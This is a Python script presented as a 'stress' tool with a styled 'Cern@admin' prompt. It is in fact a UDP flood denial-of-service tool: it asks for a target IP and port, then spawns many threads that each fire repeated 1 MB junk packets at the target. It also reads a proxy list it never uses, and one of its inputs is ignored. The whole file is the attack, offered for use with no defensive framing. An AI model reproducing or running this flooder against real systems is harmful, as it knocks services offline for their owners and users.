import socket
import os
from colorama import Fore
import platform
from threading import Thread

def clear():
    if platform.system() == 'Windows':
        os.system("cls")
    else:
        os.system("clear")

def dos():
    clear()
    print("Cern@admin-[$]> Enter Target IP ")
    ip = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Target Port ")
    port = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Number of Threads ")
    threads = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Number of Requests ")
    requests = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Stress Length")
    length = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    def singlerequest():
            with open("proxy.txt", "r") as file:
                proxy = file.read().strip()
                proxies = {
                'http': f'socks4://{proxy}',
                'https': f'socks5://{proxy}'
            }
            for _ in range(int(length)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(6)
                    sock.sendto(b'A' * 1048576, (ip, int(port)))
                    print(f"Cern@admin-[$]> Sent request to {ip} on port {port}")
                except:
                    print(f"Cern@admin-[$]> Failed to send request to {ip} on port {port}")
                finally:
                    sock.close()
    threads_list = []
    for _ in range(int(threads)):
        t = Thread(target=singlerequest)
        threads_list.append(t)
        t.start()

